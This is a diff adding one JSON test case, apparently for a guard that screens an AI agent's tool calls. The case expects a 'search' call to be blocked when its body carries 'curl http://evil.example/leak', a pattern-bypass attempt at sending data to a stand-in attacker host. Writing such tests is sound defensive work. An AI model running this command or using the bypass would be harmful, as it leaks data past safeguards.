@@ -1,0 +1,12 @@
+{
+  "id": "pattern-015",
+  "category": "pattern-bypass",
+  "expected": "block",
+  "policyMode": "default",
+  "context": {
+    "toolName": "search",
+    "arguments": {
+      "body": "curl http://evil.example/leak"
+    }
+  }
+}
